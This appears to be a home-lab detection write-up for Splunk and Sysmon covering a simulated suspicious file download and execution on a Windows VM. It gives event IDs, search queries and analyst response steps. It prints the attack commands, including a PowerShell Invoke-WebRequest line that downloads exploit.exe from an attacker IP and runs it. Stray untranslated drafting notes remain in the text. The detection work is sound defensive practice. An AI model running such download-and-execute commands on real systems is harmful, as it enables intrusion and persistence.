

# Detection Usecase 3 : Suspicious File Download and Execution


# Scenario Summary: 
Attacker or Malicious Person attemps to download and execute a shell in the target system  
to maintain persistence with the target, using Powershell.

# Attack Steps:
Here, Virtual Windows 11 is the victim where universal forwarder is running,  
and Virtual Kali Linux is the attacker.

- The Attack was simulated by Kali Linux on Windows as follows:  
1) Attacker Login to Victim Machine via SSH  
```
ssh sshuser@10.10.99.77
```  
2) Opened a Python Server from which local file can be uploaded in remote system.  
```
python3 -m http.server 80
```  

3) He tries to upload and execute a shell through powershell to stay persistent in target system.
```
Invoke-WebRequest -URi http://10.10.90.252/exploit.exe -Outfile C:\Users\sshuser\shell.exe  
Start-Process C:\Users\sshuser\shell.exe
```

Tools Used:  
-Attacker Tool : SSH, Powershell, 
-SIEM : Splunk Free  
-Log Source : Windows Security Event Logs, Sysmon


# Event ID / Data Source Mapping:

| Source                    | EventCode | Description                      |
|---------------------------|-----------|----------------------------------|
| WinEventLog : Security    | 4624      | Successfully Logged On           |
| WinEventLog : Sysmon      | 1         | Process Creation                 |
| WinEventLog : Security    | 5156      | Windows Permitted a Connection   |
| WinEventLog : Sysmon      | 3         | Network Connection Detected      |
| WinEventLog : Sysmon      | 11        | File Creation                    |
File run karna hai poweru.ps1
| WinEventLog : Security    | 4634      | User was logged off              |

# Detection Query / Logic:
```spl 
- Search Login
index=* EventCode=4624 Account_Domain="VIRTUAL USERS" sshd.exe
```
```spl 
- Search Pwsh
index=* EventCode=1 CommandLine="powershell"
```
```spl 
- Search Connection Attempt
index=* EventCode=3 OR EventCode=5156
```
```spl 
- Search File Creation
index=* EventCode=11
```

# Sample Alert Screenshot

1) Attacker Run command : powershell 
![powershell](<logs/Screenshot 2025-05-25 134135.png>)

3) Try to make connection with a remote server.  
![permits](<screenshots/Screenshot 2025-05-25 134338.png>)
![attempt](<logs/Screenshot 2025-05-25 132612.png>)

4) System has generated a file based on the pwsh cmd.  
![file](<logs/Screenshot 2025-05-25 135543.png>)

5) File was run  
#----------------Photo nikal iska----------------

6) Downloaded File  
![downloaded](<screenshots/Screenshot 2025-05-25 135810.png>)

# Analyst Notes / Recommendations:

* What Should an Analyst do ? 

-> Investigate and Verify the events through analysis of log and alerts.  
-> Try to look for pattern like File Extension's(.e.g., .exe, .ps1, .php etc).  
-> If it is a unauthorized execution , then try to isolate the System, Kill the process, & Block the domain or IP.  
-> Fix the vulnerability which caused the attack to happen(e.g., Password Policy - Change Pass every week).  
-> Report & Document.


# Detection Status

 -> Successfully Detected.  
